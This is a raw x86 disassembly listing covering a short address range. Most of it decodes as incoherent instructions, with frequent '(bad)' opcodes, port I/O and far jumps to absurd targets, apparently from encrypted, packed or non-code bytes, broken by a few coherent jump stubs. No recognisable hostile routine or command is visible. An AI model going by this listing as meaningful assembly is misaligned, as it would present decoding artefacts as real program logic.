  40b426:	mov    eax,ds:0x1578f3aa
  40b42b:	dec    esi
  40b42c:	(bad)  
  40b42d:	in     al,dx
  40b42e:	cmp    al,0x59
  40b430:	push   0x16
  40b432:	xor    BYTE PTR [ecx+edi*8+0x3d],ch
  40b436:	push   ebp
  40b437:	cld    
  40b438:	adc    DWORD PTR [esi],eax
  40b43a:	jmp    0x64aa:0xa5ab5265
  40b441:	lock loope 0x40b4a2
  40b444:	cmp    DWORD PTR [edi+0x59f96493],ebx
  40b44a:	aaa    
  40b44b:	imul   DWORD PTR [ebp+0x777a0ca]
  40b451:	jle    0x40b436
  40b453:	aad    0x3
  40b455:	or     eax,0x6171979c
  40b45a:	test   eax,0xfbd511dc
  40b45f:	lea    ecx,[ecx-0x59]
  40b462:	clc    
  40b463:	fmul   st(2),st
  40b465:	shr    DWORD PTR ds:0xb5fb1b3f,cl
  40b46b:	dec    ecx
  40b46c:	loop   0x40b455
  40b46e:	xor    al,dh
  40b470:	mov    ss,WORD PTR [esi]
  40b472:	xor    al,0x14
  40b474:	jmp    0xf900fc05
  40b479:	adc    eax,0x639c33be
  40b47e:	and    BYTE PTR [esi+eax*8],al
  40b481:	outs   dx,BYTE PTR ds:[esi]
  40b482:	test   al,0xb1
  40b484:	into   
  40b485:	jge    0x40b44f
  40b487:	jno    0x40b4e7
  40b489:	pushf  
  40b48a:	jg     0x40b4a7
  40b48c:	shl    BYTE PTR ss:[ecx-0x22],1
  40b490:	les    esi,FWORD PTR [ebp-0x78]
  40b493:	or     DWORD PTR [ecx-0x45002d9],0xa5962a67
  40b49d:	cmp    DWORD PTR [edx],edx
  40b49f:	pop    ebp
  40b4a0:	add    al,0x98
  40b4a2:	jl     0x40b4a0
  40b4a4:	fstp   st(2)
  40b4a6:	sbb    al,0xf7
  40b4a8:	popf   
  40b4a9:	dec    esi
  40b4aa:	addr16 mov ds:0x2bd2,eax
  40b4ae:	mov    ds:0xfde19367,al
  40b4b3:	imul   DWORD PTR [ecx]
  40b4b5:	and    BYTE PTR [esi-0x7e296870],cl
  40b4bb:	jmp    0x9d4c:0xaee15787
  40b4c2:	clc    
  40b4c3:	dec    ebp
  40b4c4:	mov    dh,0x15
  40b4c6:	stos   BYTE PTR es:[edi],al
  40b4c7:	or     DWORD PTR [edx],eax
  40b4c9:	into   
  40b4ca:	xor    BYTE PTR [eax+ebp*2+0x536ac74a],0x46
  40b4d2:	xchg   ecx,eax
  40b4d3:	das    
  40b4d4:	mov    dh,0xec
  40b4d6:	jmp    0x2dd974ea
  40b4db:	aad    0xcd
  40b4dd:	jg     0x40b4e0
  40b4df:	(bad)  
  40b4e0:	mov    edx,0x1c162721
  40b4e5:	or     BYTE PTR [ecx-0x464f3695],bl
  40b4eb:	sub    edi,edi
  40b4ed:	jecxz  0x40b4f6
  40b4ef:	and    DWORD PTR [edx],eax
  40b4f1:	push   0x40
  40b4f3:	fcmovnu st,st(6)
  40b4f5:	test   DWORD PTR [esi+0x100c782f],ebx
  40b4fb:	jno    0x40b495
  40b4fd:	add    DWORD PTR es:[eax+0x4eae1a30],ecx
  40b504:	inc    ebx
  40b505:	mov    bl,bl
  40b507:	lods   al,BYTE PTR ds:[esi]
  40b508:	xor    DWORD PTR [esi+0x89f094b],esi
  40b50e:	ficomp WORD PTR [edx-0x5a]
  40b511:	in     al,dx
  40b512:	popf   
  40b513:	dec    esi
  40b514:	mov    bl,0x49
  40b516:	adc    ebp,DWORD PTR [ebp+0x63]
  40b519:	jb     0x40b55b
  40b51b:	arpl   WORD PTR es:[ecx+0x76],sp
  40b51f:	popa   
  40b520:	inc    esp
  40b521:	xchg   ebp,eax
  40b522:	fbld   TBYTE PTR [ebp-0x7]
  40b525:	pop    eax
  40b526:	loope  0x40b519
  40b528:	(bad)  
  40b529:	mov    esi,0xd6e0490d
  40b52e:	aam    0x63
  40b530:	mov    esp,0x7e266198
  40b535:	(bad)  
  40b536:	jmp    DWORD PTR [edx+0x7d7318e]
  40b53c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b53d:	xchg   edx,eax
  40b53e:	cmp    bh,al
  40b540:	cs unpcklps xmm5,xmm3
  40b544:	loop   0x40b53f
  40b546:	scas   eax,DWORD PTR es:[edi]
  40b547:	scas   al,BYTE PTR es:[edi]
  40b548:	sub    eax,0x80c402a7
  40b54d:	mov    DWORD PTR [ebx-0x247cf9f1],eax
  40b553:	mov    ah,0xb4
  40b555:	fwait
  40b556:	push   0x7c
  40b558:	xchg   ecx,eax
  40b559:	mov    cl,0x57
  40b55b:	add    BYTE PTR [ebp+0x49],0x55
  40b55f:	mov    DWORD PTR [edx-0x539935d5],esi
  40b565:	test   BYTE PTR [esi+eiz*2-0x1d],dl
  40b569:	mov    WORD PTR [eax],?
  40b56b:	sub    dh,ch
  40b56d:	mov    eax,ds:0x4cc1c24b
  40b572:	cmp    eax,0xb5f727ac
  40b577:	gs add bl,cl
  40b57a:	js     0x40b5f9
  40b57c:	mov    esp,0x96a73f6f
  40b581:	jg     0x40b547
  40b583:	push   ds
  40b584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b585:	mov    DWORD PTR [esi-0x1d],edx
  40b588:	and    al,0x62
  40b58a:	mov    eax,0x53bc913d
  40b58f:	into   
  40b590:	add    ebp,0x2d
  40b593:	je     0x40b5f8
  40b595:	not    bh
  40b597:	pop    ebp
  40b598:	cdq    
  40b599:	pop    edi
  40b59a:	push   ss
  40b59b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b59c:	push   edi
  40b59d:	call   0xbcb991bd
  40b5a2:	test   edx,0x7782f22c
  40b5a8:	and    BYTE PTR [ecx],0x98
  40b5ab:	cmp    eax,0xa5b76593
  40b5b0:	xchg   edx,eax
  40b5b1:	and    BYTE PTR [esi+0x7c2ec7a7],bl
  40b5b7:	outs   dx,DWORD PTR ds:[esi]
  40b5b8:	push   ecx
  40b5b9:	jno    0x40b62d
  40b5bb:	fdivr  DWORD PTR [esp+ebp*8]
  40b5be:	xor    DWORD PTR [edx+0x73],0x22
  40b5c2:	push   ds
  40b5c3:	mov    ebx,esp
  40b5c5:	push   0x6d66283b
  40b5ca:	(bad)  
  40b5cb:	pop    es
  40b5cc:	xor    esi,DWORD PTR [eax]
  40b5ce:	push   ebp
  40b5cf:	arpl   WORD PTR [edi],cx
  40b5d1:	lea    esi,[edi-0x3d]
  40b5d4:	add    DWORD PTR [eax],edx
  40b5d6:	std    
  40b5d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5d8:	and    DWORD PTR [ebp+0x7],eax
  40b5db:	mov    eax,ds:0x8bc70825
  40b5e0:	fsub   DWORD PTR [ebx-0x4b174c70]
  40b5e6:	fwait
  40b5e7:	push   cs
  40b5e8:	aaa    
  40b5e9:	ret    
  40b5ea:	mov    bh,0xfc
  40b5ec:	sahf   
  40b5ed:	xor    cl,BYTE PTR [edi+edi*4+0x348c09f2]
  40b5f4:	out    dx,al
  40b5f5:	in     eax,0x1a
  40b5f7:	mov    ?,WORD PTR [esi]
  40b5f9:	xchg   esp,eax
  40b5fa:	mov    eax,ds:0x1c0a330a
  40b5ff:	bswap  ebx
  40b601:	loope  0x40b644
  40b603:	pop    es
  40b604:	mov    eax,DWORD PTR [ebp-0x10]
  40b607:	mov    DWORD PTR [ebp-0x10],eax
  40b60a:	mov    eax,DWORD PTR [ebp-0x1c]
  40b60d:	jmp    0x40bb18
  40b612:	vpsrld xmm2,xmm7,xmm6
  40b616:	fcmovbe st,st(5)
  40b618:	leave  
  40b619:	sar    DWORD PTR [ebx-0x5],1
  40b61c:	cmp    al,0x28
  40b61e:	mov    dl,0xc3
  40b620:	popa   
  40b621:	jmp    0x78b951de
  40b626:	push   0x7c
  40b628:	js     0x40b6a2
  40b62a:	xchg   edx,eax
  40b62b:	dec    ecx
  40b62c:	xchg   esp,eax
  40b62d:	jb     0x40b5e2
  40b62f:	(bad)  
  40b630:	ret    
  40b631:	std    
  40b632:	clc    
  40b633:	sbb    DWORD PTR [ebx],ebx
  40b635:	inc    esp
  40b636:	cwde   
  40b637:	idiv   eax
  40b639:	out    0x2f,al
  40b63b:	jmp    0x40b66a
  40b63d:	adc    cl,bh
  40b63f:	mov    bl,0x4
  40b641:	or     ch,dl
  40b643:	inc    eax
  40b644:	dec    ecx
  40b645:	test   al,0x1b
  40b647:	mov    esi,esp
  40b649:	mov    al,0x79
  40b64b:	out    0x65,eax
  40b64d:	push   0xf7bac52a
  40b652:	(bad)  
  40b654:	rcl    ch,0xbe
  40b657:	push   ds
  40b658:	mov    ebx,0xfddcd022
  40b65d:	xchg   BYTE PTR [ecx+0x57],bl
  40b660:	jmp    0x40b681
  40b662:	jmp    0x40b5ec
  40b664:	cmp    al,BYTE PTR [eax+0x65]
  40b667:	aam    0x57
  40b669:	rcl    cl,cl
  40b66b:	or     DWORD PTR [ecx+edi*4],eax
  40b66e:	pop    ds
  40b66f:	fsubr  QWORD PTR [ebx-0x3f220d46]
  40b675:	icebp  
  40b676:	repz pop ds
  40b678:	push   edx
  40b679:	jno    0x40b603
  40b67b:	sbb    DWORD PTR [esi-0x5a4004f1],edx
  40b681:	xor    eax,0x8377487e
  40b686:	mov    al,ds:0x23ce1637
  40b68b:	out    0x49,al
  40b68d:	lods   eax,DWORD PTR ds:[esi]
  40b68e:	psrlq  mm3,QWORD PTR [ebp+ebx*4+0x1f0ca589]
  40b696:	pop    esi
  40b697:	cli    
  40b698:	jle    0x40b6ac
  40b69a:	loopne 0x40b65e
  40b69c:	shr    DWORD PTR [edi+0x7f],0xe1
  40b6a0:	mov    fs,ebx
  40b6a2:	imul   ebp,DWORD PTR [ebx+0x4eee01de],0x7737ed8e
  40b6ac:	aaa    
  40b6ad:	out    dx,al
  40b6ae:	push   0x23f28892
  40b6b3:	xchg   esp,eax
  40b6b4:	push   ecx
  40b6b5:	dec    esp
  40b6b6:	xor    al,0x93
  40b6b8:	ret    0x1be3
  40b6bb:	pop    esp
  40b6bc:	mov    eax,0x4dcc52a6
  40b6c1:	fwait
  40b6c2:	call   0x2cd8:0x8710b100
  40b6c9:	rcl    DWORD PTR [edi-0x40],cl
  40b6cc:	(bad)  
  40b6cd:	xor    edx,ebp
  40b6cf:	mov    edi,0xfd7a33d2
  40b6d4:	lods   al,BYTE PTR ds:[esi]
  40b6d5:	aaa    
  40b6d6:	(bad)  
  40b6d7:	fsubr  QWORD PTR [edi+esi*4+0x1ecafd9d]
  40b6de:	dec    esi
  40b6df:	repnz cmp ebx,esp
  40b6e2:	mov    ah,0x99
  40b6e4:	xchg   BYTE PTR [eax],dl
  40b6e6:	mov    ch,0xe9
  40b6e8:	or     esi,DWORD PTR [esp+eiz*8]
  40b6eb:	or     ah,BYTE PTR [edx+0x1c132ca8]
  40b6f1:	movups xmm2,XMMWORD PTR [eax-0xf]
  40b6f5:	shr    ah,1
  40b6f7:	sbb    ecx,ecx
  40b6f9:	mov    edx,0x30aa5fab
  40b6fe:	sar    BYTE PTR [edx],0xb1
  40b701:	and    al,ch
  40b703:	xor    dl,BYTE PTR [ebx+0x6a]
  40b706:	pop    edx
  40b707:	(bad)  
  40b708:	(bad)  
  40b709:	lahf   
  40b70a:	pop    esp
  40b70b:	push   es
  40b70c:	add    al,0xe2
  40b70e:	mov    ds:0x62f7b82e,al
  40b713:	dec    ebx
  40b714:	js     0x40b736
  40b716:	mov    ds:0xe8832669,al
  40b71b:	pop    edx
  40b71c:	push   edi
  40b71d:	test   DWORD PTR [esp+esi*8+0x4f],esi
  40b721:	xchg   ebx,eax
  40b722:	push   ebp
  40b723:	mov    eax,DWORD PTR [esi]
  40b725:	mov    bl,0x24
  40b727:	rcr    cl,1
  40b729:	fcomip st,st(7)
  40b72b:	fld    DWORD PTR [edx+0x664cf2d4]
  40b731:	jb     0x40b721
  40b733:	inc    ebx
  40b734:	aaa    
  40b735:	aad    0x7d
  40b737:	not    BYTE PTR [ebx+0x6f]
  40b73a:	cmp    BYTE PTR [ebx-0x51a5e34a],cl
  40b740:	mov    esi,esi
  40b742:	jp     0x40b787
  40b744:	lods   eax,DWORD PTR ds:[esi]
  40b745:	and    eax,0x1b186dbb
  40b74a:	das    
  40b74b:	iret   
  40b74c:	popa   
  40b74d:	jmp    0x40b77d
  40b74f:	push   ds
  40b750:	push   0xffffffd7
  40b752:	add    BYTE PTR [ecx-0x24fc64b3],bl
  40b758:	fist   DWORD PTR [ebx-0x6b02264a]
  40b75e:	and    BYTE PTR [eax],bl
  40b760:	sbb    DWORD PTR ds:0x9d88142e,ebp
  40b766:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b768:	shl    BYTE PTR [edx],cl
  40b76a:	pop    esp
  40b76b:	pop    DWORD PTR [edx+0x1a8a796c]
  40b771:	jmp    0xc0cb:0x57621804
  40b778:	fs sbb al,0xb6
  40b77b:	add    edx,eax
  40b77d:	test   al,0xdf
  40b77f:	mov    cl,ah
  40b781:	lock mov ds,WORD PTR [esi+ebp*2]
  40b785:	cmp    eax,0x9f8635e8
  40b78a:	mov    edi,DWORD PTR [eax]
  40b78c:	es sub eax,0x5c07fa9d
  40b792:	push   ebp
  40b793:	inc    edx
  40b794:	cwde   
  40b795:	push   ss
  40b796:	jmp    0xcb81:0x9326218b
  40b79d:	jmp    DWORD PTR [esi]
  40b79f:	xchg   ebp,eax
  40b7a0:	dec    eax
  40b7a1:	push   esp
  40b7a2:	mov    ebx,0x4eec8b00
  40b7a7:	(bad)  
  40b7a8:	jb     0x40b785
  40b7aa:	test   BYTE PTR [eax],dl
  40b7ac:	nop
  40b7ad:	push   eax
  40b7ae:	mov    esi,0x3ae6655e
  40b7b3:	pop    ecx
  40b7b4:	sub    ah,BYTE PTR [edi-0x183f657f]
  40b7ba:	sub    ebp,DWORD PTR [ebp-0x3a34806f]
  40b7c0:	test   al,0x7
  40b7c2:	stos   DWORD PTR es:[edi],eax
  40b7c3:	int3   
  40b7c4:	jb     0x40b781
  40b7c6:	repz fwait
  40b7c8:	sub    bl,BYTE PTR [esi+0x627f9290]
  40b7ce:	or     bl,ah
  40b7d0:	stos   DWORD PTR es:[edi],eax
  40b7d1:	mov    WORD PTR [eax+0x28c3d1e],ds
  40b7d7:	dec    esp
  40b7d8:	jns    0x40b825
  40b7da:	ja     0x40b795
  40b7dc:	mov    al,ch
  40b7de:	sahf   
  40b7df:	push   cs
  40b7e0:	adc    al,BYTE PTR [edi-0x10]
  40b7e3:	pop    edx
  40b7e4:	mov    cl,0x0
  40b7e6:	loopne 0x40b786
  40b7e8:	mov    edi,0x35da9934
  40b7ed:	in     eax,dx
  40b7ee:	clc    
  40b7ef:	cli    
  40b7f0:	pop    ebp
  40b7f1:	and    ah,BYTE PTR [edx-0x59f31006]
  40b7f7:	arpl   si,ax
  40b7f9:	sbb    eax,0x82d31f18
  40b7fe:	cdq    
  40b7ff:	sub    eax,eax
  40b801:	clc    
  40b802:	sbb    ecx,ecx
  40b804:	mov    dl,cl
  40b806:	cdq    
  40b807:	imul   edi,DWORD PTR [ebp+0xe],0x1e
  40b80b:	ins    BYTE PTR es:[edi],dx
  40b80c:	adc    dl,bh
  40b80e:	adc    eax,0xb1175799
  40b813:	add    DWORD PTR [eax-0x415775f8],ecx
  40b819:	mov    al,ds:0xddf2cc4a
  40b81e:	dec    ecx
  40b81f:	jl     0x40b842
  40b821:	test   eax,0x69cda35c
  40b826:	or     BYTE PTR [ebx+ecx*2],dh
  40b829:	mov    eax,ds:0x790911c2
  40b82e:	nop
  40b82f:	xchg   ebx,eax
  40b830:	dec    ecx
  40b831:	out    dx,al
  40b832:	and    al,0x4c
  40b834:	rcl    esp,0x25
  40b837:	sub    al,0x71
  40b839:	sub    eax,0x4e3fa63b
  40b83e:	add    DWORD PTR [edi+edx*8],ebx
  40b841:	ins    DWORD PTR es:[edi],dx
  40b842:	mov    WORD PTR [eax-0x4b09a3db],?
  40b848:	mov    al,0xba
  40b84a:	cmp    DWORD PTR [ebp+0x4a843d0f],edi
  40b850:	scas   eax,DWORD PTR es:[edi]
  40b851:	fist   WORD PTR [esi-0x2ed73ef8]
  40b857:	xor    dh,BYTE PTR [edi+0x3fa53b22]
  40b85d:	clc    
  40b85e:	adc    bl,cl
  40b860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b861:	jno    0x40b89f
  40b863:	cmc    
  40b864:	shr    ebx,cl
  40b866:	adc    edi,eax
  40b868:	aaa    
  40b869:	mov    gs:0x2f82003f,eax
  40b86f:	dec    ebp
  40b870:	pop    ds
  40b871:	outs   dx,BYTE PTR ds:[esi]
  40b872:	retf   
  40b873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b874:	jp     0x40b87b
  40b876:	retf   0xe6fa
  40b879:	scas   eax,DWORD PTR es:[edi]
  40b87a:	cmp    esp,edi
  40b87c:	dec    edi
  40b87d:	(bad)  
  40b87e:	or     DWORD PTR [edi+ebx*2+0x1f7cb742],esp
  40b885:	std    
  40b886:	in     al,dx
  40b887:	mov    bl,0x61
  40b889:	sbb    BYTE PTR [ebx],dl
  40b88b:	inc    ecx
  40b88c:	mov    cl,0x86
  40b88e:	addr16 inc ebx
  40b890:	jp     0x40b876
  40b892:	imul   DWORD PTR [edi+edx*4+0x57]
  40b896:	nop
  40b897:	aas    
  40b898:	rcr    DWORD PTR [edx],1
  40b89a:	repz mov eax,0xa137267a
  40b8a0:	cmp    eax,0xeda96b11
  40b8a5:	push   0x3409eaa7
  40b8aa:	jae    0x40b8b4
  40b8ac:	in     al,0xb9
  40b8ae:	test   al,bl
  40b8b0:	shl    edi,0xa6
  40b8b3:	pop    eax
  40b8b4:	or     DWORD PTR [ecx+0x12],edx
  40b8b7:	fnsave [ebp+0x55]
  40b8ba:	shl    BYTE PTR [ebx],cl
  40b8bc:	(bad)  
  40b8bd:	dec    esi
  40b8be:	clc    
  40b8bf:	pop    eax
  40b8c0:	fidiv  DWORD PTR [esi-0x38]
  40b8c3:	aaa    
  40b8c4:	or     eax,0x71f7e6ae
  40b8c9:	or     DWORD PTR [esi],0x84438d7b
  40b8cf:	call   0x2d522268
  40b8d4:	mov    ebp,0x9c212b8f
  40b8d9:	repnz lea esi,[ebp-0x3e]
  40b8dd:	add    al,bl
  40b8df:	xchg   esp,eax
  40b8e0:	sub    edx,DWORD PTR [esi+0x7f5ec207]
  40b8e6:	xor    BYTE PTR [eax+0xb],cl
  40b8e9:	fnstenv [edi+0xa28afac]
  40b8ef:	mov    ah,0xaf
  40b8f1:	adc    DWORD PTR [ebx+0xce12815],0xe733be4d
  40b8fb:	adc    eax,0x657ae3fa
  40b900:	hlt    
  40b901:	push   esp
  40b902:	mov    ds:0x22a24228,al
  40b907:	fs push ds
  40b909:	ss and eax,0x24d40184
  40b90f:	xor    DWORD PTR [edi],esi
  40b911:	sbb    al,0x8f
  40b913:	or     edi,DWORD PTR [edx+0x2d]
  40b916:	pop    esi
  40b917:	cmp    DWORD PTR [edi-0x74],ebx
  40b91a:	xor    BYTE PTR [edx],0x70
  40b91d:	sbb    ah,bh
  40b91f:	in     eax,0x8f
  40b921:	cli    
  40b922:	repnz push es
  40b924:	fwait
  40b925:	mov    al,BYTE PTR [ecx+0x1275d64a]
  40b92b:	pop    ss
  40b92c:	gs leave 
  40b92e:	clc    
  40b92f:	xchg   edi,eax
  40b930:	xor    al,0xc3
  40b932:	push   esp
  40b933:	or     edi,ebx
  40b935:	xor    BYTE PTR [edx],al
  40b937:	jecxz  0x40b8cc
  40b939:	fiadd  WORD PTR [edx-0x6550a35d]
  40b93f:	fwait
  40b940:	dec    edx
  40b941:	mov    ebp,0xa2cb47a7
  40b946:	xlat   BYTE PTR ds:[ebx]
  40b947:	xor    dl,bh
  40b949:	test   al,0xb8
  40b94b:	lods   al,BYTE PTR ds:[esi]
  40b94c:	jle    0x40b8ea
  40b94e:	or     DWORD PTR [eax],edx
  40b950:	sub    DWORD PTR [ebx+0x29ae821c],esp
  40b956:	dec    esp
  40b957:	stos   DWORD PTR es:[edi],eax
  40b958:	sbb    eax,0x13e61ed3
  40b95d:	mov    bl,0xff
  40b95f:	ret    0xd252
  40b962:	xchg   al,ch
  40b964:	and    al,0x96
  40b966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b967:	out    0x2e,eax
  40b969:	and    al,0x80
  40b96b:	push   cs
  40b96c:	fstp   DWORD PTR [edx+0x28]
  40b96f:	pop    edx
  40b970:	push   ds
  40b971:	sbb    al,0xa2
  40b973:	js     0x40b95f
  40b975:	je     0x40b9d0
  40b977:	cli    
  40b978:	xchg   ebp,eax
  40b979:	lea    ebx,[esi+0x188ede30]
  40b97f:	out    dx,al
  40b980:	dec    ebx
  40b981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b982:	(bad)  
  40b983:	cmp    eax,0x90c9f1f4
  40b988:	ret    
  40b989:	dec    esp
  40b98a:	(bad)  
  40b98b:	cwde   
  40b98c:	out    0x2,eax
  40b98e:	pop    ecx
  40b98f:	or     al,BYTE PTR [ebx-0x4c]
  40b992:	mov    edi,0x89ff9dcc
  40b997:	dec    ebx
  40b998:	dec    edi
  40b999:	cmp    eax,0x870a7f86
  40b99e:	scas   al,BYTE PTR es:[edi]
  40b99f:	mov    BYTE PTR [esi+0x75837c55],dh
  40b9a5:	mov    cl,0xa9
  40b9a7:	pop    edx
  40b9a8:	dec    edi
  40b9a9:	pop    ss
  40b9aa:	cmp    edi,ecx
  40b9ac:	sbb    dl,BYTE PTR [esi-0x58970d83]
  40b9b2:	ins    DWORD PTR es:[edi],dx
  40b9b3:	sub    ebx,0xffffffa9
  40b9b6:	shl    BYTE PTR [edi+0x6d530eab],cl
  40b9bc:	jns    0x40ba24
  40b9be:	mov    ecx,DWORD PTR [edx-0x1502b472]
  40b9c4:	inc    edx
  40b9c5:	cmp    BYTE PTR [ebx-0x7f760919],cl
  40b9cb:	adc    eax,0xe63567e1
  40b9d0:	inc    esp
  40b9d1:	das    
  40b9d2:	js     0x40b9bf
  40b9d4:	pop    esi
  40b9d5:	push   0xdac1f45c
  40b9da:	mov    ah,0xba
  40b9dc:	adc    eax,ecx
  40b9de:	ret    
  40b9df:	push   cs
  40b9e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e1:	sbb    BYTE PTR [esi],ah
  40b9e3:	enter  0x81b5,0x12
  40b9e7:	or     BYTE PTR [ebp-0x154fba52],al
  40b9ed:	xor    eax,0x568aee87
  40b9f2:	inc    edx
  40b9f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9f4:	data16 jne 0x40ba19
  40b9f7:	das    
  40b9f8:	xchg   edi,eax
  40b9f9:	or     cl,BYTE PTR [ecx+0x1a5faa35]
  40b9ff:	xor    BYTE PTR [eax+esi*8+0x6de23f0b],dh
  40ba06:	mov    ds:0x172ec85c,al
  40ba0b:	hlt    
  40ba0c:	adc    eax,0x9bb8b517
  40ba11:	fisttp QWORD PTR [ecx]
  40ba13:	mov    edi,0x860dcc3f
  40ba18:	pop    bp
  40ba1a:	stos   DWORD PTR es:[edi],eax
  40ba1b:	mov    bh,0x44
  40ba1d:	mov    al,ds:0xe79cd41e
  40ba22:	ret    0x45d0
  40ba25:	sbb    ebx,DWORD PTR [ebx]
  40ba27:	ror    esi,0x6f
  40ba2a:	push   ebp
  40ba2b:	sub    eax,0xe879ed34
  40ba30:	call   0x30fe:0xe1c3b0e7
  40ba37:	pop    es
  40ba38:	xchg   ebx,eax
  40ba39:	popf   
  40ba3a:	(bad)  
  40ba3b:	in     al,dx
  40ba3c:	or     eax,DWORD PTR [esp+edi*8+0x33]
  40ba40:	nop
  40ba41:	fs add eax,0x209069a0
  40ba47:	mov    ss,WORD PTR [ebp+0x2e]
  40ba4a:	das    
  40ba4b:	lock lahf 
  40ba4d:	pop    ebp
  40ba4e:	sub    al,0x48
  40ba50:	ret    
  40ba51:	cli    
  40ba52:	bound  edx,QWORD PTR [edi]
  40ba54:	ins    BYTE PTR es:[edi],dx
  40ba55:	inc    eax
  40ba56:	shl    BYTE PTR [esi],1
  40ba58:	adc    eax,0x3d4fedd5
  40ba5d:	dec    edx
  40ba5e:	lock scas al,BYTE PTR es:[edi]
  40ba60:	iret   
  40ba61:	out    0x71,al
  40ba63:	and    al,0x34
  40ba65:	mov    esi,0x4b529ceb
  40ba6a:	ja     0x40ba9e
  40ba6c:	or     dh,BYTE PTR [edx-0x23]
  40ba6f:	push   esp
  40ba70:	add    dl,BYTE PTR [esi+0x51]
  40ba73:	shl    BYTE PTR [eax+0x34],1
  40ba76:	lock cli 
  40ba78:	lock shl DWORD PTR [esi+0x4d],0x1b
  40ba7d:	(bad)  
  40ba7e:	mov    cl,0xf5
  40ba80:	call   0x937e86b2
  40ba85:	out    0x4f,al
  40ba87:	inc    ebp
  40ba88:	(bad)  
  40ba8a:	pop    edi
  40ba8b:	outs   dx,BYTE PTR ds:[esi]
  40ba8c:	xchg   esp,eax
  40ba8d:	aad    0x5b
  40ba8f:	ds shl ebp,1
  40ba92:	adc    eax,edx
  40ba94:	test   ch,0xf2
  40ba97:	and    bh,BYTE PTR [ecx-0x1d]
  40ba9a:	jns    0x40ba50
  40ba9c:	daa    
  40ba9d:	loopne 0x40bafc
  40ba9f:	jecxz  0x40ba96
  40baa1:	jg     0x40bb1f
  40baa3:	mov    ch,0x3c
  40baa5:	mov    WORD PTR [ebx],?
  40baa7:	mov    ecx,0xd98f1b97
  40baac:	mov    ds:0xd29eeb12,eax
  40bab1:	mov    ah,0xa6
  40bab3:	push   ecx
  40bab4:	push   esi
  40bab5:	mov    ch,BYTE PTR [ebx-0x61]
  40bab8:	add    edx,ebx
  40baba:	stos   BYTE PTR es:[edi],al
  40babb:	stos   BYTE PTR es:[edi],al
  40babc:	mov    ch,0x1f
  40babe:	pop    ebp
  40babf:	ss jecxz 0x40bb13
  40bac2:	pop    edx
  40bac3:	and    eax,0xc462f57
  40bac8:	and    ch,0x28
  40bacb:	popa   
  40bacc:	cmp    dl,BYTE PTR [ecx-0x23]
  40bacf:	pop    esp
  40bad0:	mov    esp,0x54e9afce
  40bad5:	sbb    eax,0xe6b827f
  40bada:	std    
  40badb:	lea    ebx,[esi+0x1ad907bf]
  40bae1:	push   es
  40bae2:	mov    edi,0xd9751985
  40bae7:	cmc    
  40bae8:	aam    0xbf
  40baea:	pushf  
  40baeb:	inc    esi
  40baec:	nop
  40baed:	xchg   BYTE PTR [ebx],dh
  40baef:	mov    ds:0xa2b6186,al
  40baf4:	mul    BYTE PTR [eax+0x8]
  40baf7:	mov    cl,0x50
  40baf9:	outs   dx,BYTE PTR ds:[esi]
  40bafa:	xor    al,0xad
  40bafc:	push   ss
  40bafd:	out    0x6d,eax
  40baff:	jae    0x40baf7
  40bb01:	sub    ecx,DWORD PTR [esi+0x2dbed0eb]
  40bb07:	retf   0x775
  40bb0a:	mov    esi,0x494c1f66
  40bb0f:	add    DWORD PTR [eax+0x21],ebx
  40bb12:	jne    0x40bb2e
  40bb14:	xchg   cl,ch
  40bb16:	inc    edi
  40bb17:	stos   DWORD PTR es:[edi],eax
  40bb18:	mov    DWORD PTR [ebp-0x40],ebx
  40bb1b:	mov    DWORD PTR [ebp-0x2c],eax
  40bb1e:	mov    eax,DWORD PTR [ebp-0x40]
  40bb21:	jmp    0x40c02c
  40bb26:	ror    esp,1
  40bb28:	ror    ah,cl
  40bb2a:	rcl    edx,1
  40bb2c:	rcl    ecx,1
  40bb2e:	cld    
  40bb2f:	in     al,dx
  40bb30:	lock cmp eax,0xff9ce757
  40bb36:	stos   BYTE PTR es:[edi],al
  40bb37:	sahf   
  40bb38:	js     0x40bbb2
  40bb3a:	push   0x7c
  40bb3c:	js     0x40bbb6
  40bb3e:	xor    dl,cl
  40bb40:	mov    ds:0xf2759ae2,eax
  40bb45:	or     DWORD PTR [esi+0x747dc58a],esp
  40bb4b:	cwde   
  40bb4c:	jmp    0x40bb09
  40bb4e:	mov    al,ds:0xfb137761
  40bb53:	ficomp DWORD PTR [edx+0x3d]
  40bb56:	sbb    edx,DWORD PTR [esi]
  40bb58:	mov    WORD PTR [edx],ss
  40bb5a:	inc    esi
  40bb5b:	sub    al,0xce
  40bb5d:	jo     0x40bbd6
  40bb5f:	shr    DWORD PTR [ebp+0x395f56f7],0xc7
  40bb66:	push   es
  40bb67:	xchg   edi,eax
  40bb68:	mov    al,0x7b
  40bb6a:	fsub   DWORD PTR [eax]
  40bb6c:	dec    edi
  40bb6d:	pusha  
  40bb6e:	aas    
  40bb6f:	adc    DWORD PTR [ebx+0x2],edx
  40bb72:	je     0x40bb0e
  40bb74:	bound  ebp,QWORD PTR [eax+0x2d054bf1]
  40bb7a:	stos   BYTE PTR es:[edi],al
  40bb7b:	xor    al,0x4
  40bb7d:	push   eax
  40bb7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb7f:	xor    BYTE PTR [ebx+0x1e85575c],0xe9
  40bb86:	jp     0x40bbf8
  40bb88:	shr    DWORD PTR [ebp+0x3],0x1b
  40bb8c:	iret   
  40bb8d:	sbb    al,0xbe
  40bb8f:	lods   al,BYTE PTR ds:[esi]
  40bb90:	mov    ebx,0xa3348613
  40bb95:	mov    esp,0x644dcab4
  40bb9a:	jae    0x40bb6a
  40bb9c:	push   edi
  40bb9d:	ss call 0xefee:0x7790d0bd
  40bba5:	bound  edx,QWORD PTR [edi]
  40bba7:	outs   dx,DWORD PTR ds:[esi]
  40bba8:	int    0xfa
  40bbaa:	cmp    DWORD PTR [eax+edx*8],0x45c1a441
  40bbb1:	inc    esp
  40bbb2:	sar    DWORD PTR [edi+eax*1],cl
  40bbb5:	jl     0x40bb42
